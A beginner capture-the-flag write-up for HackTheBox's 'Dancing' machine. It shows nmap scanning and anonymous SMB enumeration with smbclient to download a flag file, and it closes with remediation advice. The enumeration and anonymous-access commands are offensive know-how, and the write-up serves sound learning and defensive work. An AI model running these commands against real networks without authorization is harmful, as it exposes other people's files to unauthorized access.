# HackTheBox — Dancing (Starting Point) — Writeup

**Author:** Janhavi Mohite  
**Machine:** Dancing (Starting Point)  
**Date:** 2025-09-20

---

## Objective

Retrieve the user flag from the target machine `<TARGET_IP>` using allowed enumeration techniques. This was a beginner-friendly starting point focused on SMB enumeration and anonymous access.

---

## Environment

* Attacking host: Kali/Parrot machine inside HTB VPN (example IP: `10.10.15.20`)  
* Target host: `<TARGET_IP>`  
* Tools used: `nmap`, `smbclient`, `smbmap` (optional), standard shell utilities (`cat`, `ls`)

---

## Summary of steps

1. Performed service enumeration with `nmap`.  
2. Enumerated SMB shares with `smbclient -L`.  
3. Connected anonymously to the `workshare` share.  
4. Navigated directories, downloaded `flag.txt` using `get`, and read the flag locally.

---

## Reconnaissance

### Nmap scan

I ran a targeted nmap scan to identify SMB-related services:

```bash
nmap -sV -p 139,445 <TARGET_IP>
nmap -sV -sC -p- <TARGET_IP>
```

# Key findings:

Port 445/tcp — microsoft-ds (SMB) detected.

# Enumerating SMB
List available shares (attempt anonymous access first):

```bash
smbclient -L //<TARGET_IP> -N
```
-L lists shares on the host.
-N attempts anonymous login (no password prompt).

From the output I found a share named workshare (may appear as workshares on some boxes). I connected to it anonymously:

```bash
smbclient //<TARGET_IP>/workshare -N
```
After connecting I observed two directories inside the share. One directory contained flag.txt.

Downloading the flag
At the smb: prompt:
```bash
text
smb: \> ls
smb: \> cd <directory-containing-flag>
smb: \> get flag.txt
smb: \> exit
```
The get command downloads files from the SMB share into your current working directory.

Reading the flag
On the attacking machine:

```bash
ls -la
cat flag.txt
```
The file printed the user flag which completes the objective for this machine.

Commands used (compact)
```bash
nmap -sV -p 139,445 <TARGET_IP>
smbclient -L //<TARGET_IP> -N
smbclient //<TARGET_IP>/workshare -N
# inside smbclient:
#    ls
#    cd <dir>
#    get flag.txt
#    exit
# locally:
ls -la
cat flag.txt
```

## Observations & Notes
SMB stands for Server Message Block and modern SMB typically runs over TCP 445.

smbclient -L //<IP> -N is useful to quickly discover which shares allow anonymous access.

Inside the SMB shell, get downloads a file and put uploads a file.

Only access systems you are authorized to test (HTB/CTF only).

Remediation advice (for real systems)
Disable anonymous/guest SMB access unless explicitly required.

Restrict share contents and permissions to necessary users only.

Monitor SMB logs for unusual access and keep services patched.

Prefer secure alternatives for remote file transfer (SFTP/FTPS) when possible.

References / Credits
HackTheBox — Starting Point: Dancing

Tools: nmap, smbclient,

## Conclusion

The Dancing box highlighted the risks of misconfigured SMB shares that allow anonymous access.  
By enumerating SMB services with `nmap`, discovering shares with `smbclient -L`, and connecting anonymously, I was able to navigate to the `workshare` share and retrieve the `flag.txt` file.  

This reinforces the importance of proper share permissions, disabling guest/anonymous access, and regularly auditing network services for insecure defaults.
